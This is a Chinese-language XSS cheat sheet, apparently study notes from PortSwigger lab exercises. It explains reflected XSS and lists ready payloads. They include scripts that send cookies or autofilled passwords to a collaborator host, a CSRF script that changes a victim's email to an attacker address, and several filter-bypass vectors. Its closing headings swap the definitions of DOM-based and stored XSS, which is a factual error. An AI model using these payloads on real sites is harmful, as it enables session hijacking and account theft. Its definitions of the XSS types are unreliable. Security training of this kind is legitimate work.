# **xss 脚本备忘录*
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```
# XSS(跨站脚本攻击)

## 简介
```
跨站脚本攻击 (也称为 XSS) 是一种网络安全漏洞，可让攻击者破坏用户与易受攻击的应用程序之间的交互。它允许攻击者规避同源策略，该策略旨在将不同的网站彼此隔离。跨站脚本攻击漏洞通常允许攻击者伪装成受害用户，执行用户可以执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据。
```
## 工作原理
```
跨站点脚本攻击的工作原理是操纵易受攻击的网站，使其向用户返回恶意 JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者可以完全破坏他们与应用程序的交互
```
![image](https://github.com/user-attachments/assets/38d89f77-1d2c-491e-bb4f-0d04eb2d4512)

## 三种利用XSS的方法
### （1）利用跨站脚本窃取 Cookie
`您可以利用跨站点脚本漏洞将受害者的 cookie 发送到您自己的域，然后手动将 cookie 注入浏览器并冒充受害者。`
`实际上，这种方法有一些明显的局限性：`
```
1、受害者可能没有登录。
2、许多应用程序使用 HttpOnly 标志隐藏 JavaScript 中的 cookie。
3、会话可能会被锁定到其他因素，例如用户的 IP 地址。
4、会话可能会在您劫持之前超时。
```
payload:
```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
### （2）利用跨站脚本获取密码
```
如今，许多用户都拥有可以自动填充密码的密码管理器。您可以利用此功能，创建密码输入，读取自动填充的密码，并将其发送到您自己的域。这种技术避免了与窃取 cookie 相关的大多数问题，甚至可以访问受害者重复使用相同密码的每个其他帐户。
这种技术的主要缺点是它只适用于拥有执行密码自动填充的密码管理器的用户。（当然，如果用户没有保存密码，您仍然可以尝试通过现场网络钓鱼攻击获取他们的密码，但这并不完全相同。）
```
payload:
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
### (3)利用跨站脚本执行 CSRF
`合法用户可以在网站上执行的任何操作，您都可以使用 XSS 执行。根据您定位的网站，您可能能够让受害者发送消息、接受好友请求、向源代码存储库提交后门或转移一些比特币。`<br/>
`某些网站允许登录用户更改其电子邮件地址而无需重新输入密码。如果您发现了 XSS 漏洞，您可以让它触发此功能，将受害者的电子邮件地址更改为您控制的电子邮件地址，然后触发密码重置以获取对该帐户的访问权限。`<br/>
`这种类型的漏洞通常称为跨站点请求伪造 (CSRF)，这有点令人困惑，因为 CSRF 也可能作为独立漏洞发生。当 CSRF 作为独立漏洞发生时，可以使用反 CSRF 令牌等策略进行修补。但是，如果还存在 XSS 漏洞，这些策略不会提供任何保护。`<br/>
payload1:
```
<script>
window.addEventListener('DOMContentLoaded', function() {
    var token = document.getElementsByName('csrf')[0].value;

    var data = new FormData();
    data.append('csrf', token);
    data.append('email', 'evil@hacker.net');

    fetch('/my-account/change-email', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>
```
payload2:
```
window.addEventListener('DOMContentLoaded', function() {
    var token = document.getElementsByName('csrf')[0].value;

    var data = new FormData();
    data.append('csrf', token);
    data.append('email', 'evil@hacker.net');

    fetch('/my-account/change-email', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
```

## XSS攻击类型
### (1) 反射型XSS -- 恶意脚本来自当前 HTTP 请求。
#### 介绍
```
反射型 XSS 是跨站点脚本攻击中最简单的一种。当应用程序在 HTTP 请求中接收数据并以不安全的方式将该数据包含在即时响应中时，就会发生这种情况。
```
#### 产生原因
`当应用程序在 HTTP 请求中接收数据并以不安全的方式将该数据包含在即时响应中时，就会出现反射型跨站点脚本 (或 XSS)。`<br/>
#example:
`假设某个网站具有搜索功能，它可以在 URL 参数中接收用户提供的搜索词：`<br/>
```
https://insecure-website.com/search?term=gift
```
`应用程序在对此 URL 的响应中回显所提供的搜索词：`<br/>
```
<p>You searched for: gift</p>
```
`假设应用程序不对数据执行任何其他处理，攻击者可以构建如下攻击：`<br/>
```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```
`此 URL 产生以下响应：`<br/>
```
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```
`如果应用程序的另一个用户请求攻击者的 URL，那么攻击者提供的脚本将在受害者用户的浏览器中，在他们与应用程序的会话环境中执行`

#### 反射型 XSS 攻击的影响
```
1、在应用程序中执行用户可以执行的任何操作。
2、查看用户可以查看的任何信息。
3、修改用户可以修改的任何信息。
4、发起与其他应用程序用户的交互，包括恶意攻击，这些交互似乎源自最初的受害者用户。

攻击者可以通过各种方式诱使受害者用户发出他们控制的请求，以发起反射型 XSS 攻击。这些方法包括在攻击者控制的网站上放置链接，或在允许生成内容的另一个网站上放置链接，或者通过电子邮件、推文或其他消息发送链接。攻击可以直接针对已知用户，也可以对应用程序的任何用户进行无差别攻击。
```
`攻击需要外部传递机制，这意味着反射型 XSS 的影响通常不如存储型 XSS 严重，存储型 XSS 可以在易受攻击的应用程序本身内发起自包含攻击。`

#### 不同环境下的XSS
##### （1）HTML 标签之间的 XSS
###### 大多数标签和属性被过滤
`使用burpsuite intruder 测试可以绕过WAF的tag(使用BP的xss备忘录)`
![image](https://github.com/user-attachments/assets/2c75dd0b-3e1b-42c3-ab7a-66bf56e75ed7)
![image](https://github.com/user-attachments/assets/a9e73021-97af-4c74-95d5-1bf14ed610f5)
###### 除了自定义标签外，所有标签都被禁用
`使用自定义标签和可用的属性,tabindex利于触发`
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
###### 阻止带有事件处理程序和 href 属性的反射型 XSS
`通过BP intruder 找到可以用的animate属性，找到svg标签,animate可以使用父标签的属性，可以给href赋值`
```
<svg><a><animate attributeName="href" values=javascript:alert(1)></animate><text></text></a></svg>
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
###### 允许使用一些 SVG 标记的反射型 XSS
`通过BP intruder 找到可以用的onbegin事件和svg、animatetransform两个标签`
```
<svg onbegin=alert(1)>
<svg><animatetransform onbegin=alert(1)></svg>
```
##### （2）HTML 标签属性中的 XSS
`当 XSS 上下文位于 HTML 标记属性值中时，有时您可能能够终止属性值、关闭标记并引入新属性值。例如：`<br/>
```
"><script>alert(document.domain)</script>
```
`在这种情况下更常见的是，尖括号被阻止或编码，因此您的输入无法脱离它出现的标签。只要您可以终止属性值，通常就可以引入一个可创建脚本化上下文的新属性，例如事件处理程序。例如：`<br/>
```
" autofocus onfocus=alert(document.domain) x="
```
###### 尖括号被html实体化编码
![image](https://github.com/user-attachments/assets/e2ec1ba2-5b50-4218-82bb-c7b7318c96ed)
```
1、首先闭合value
2、寻找合适的事件属性，像onmouseover/onclick/onfocus等，但是相比其他，onmouseover成功几率搞，因为更自然隐蔽
payload example：
"onmouseover/onclick/onfocus="javascript:alert(1)
```
### (2) DOM型XSS -- 恶意脚本来自网站的数据库
### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。
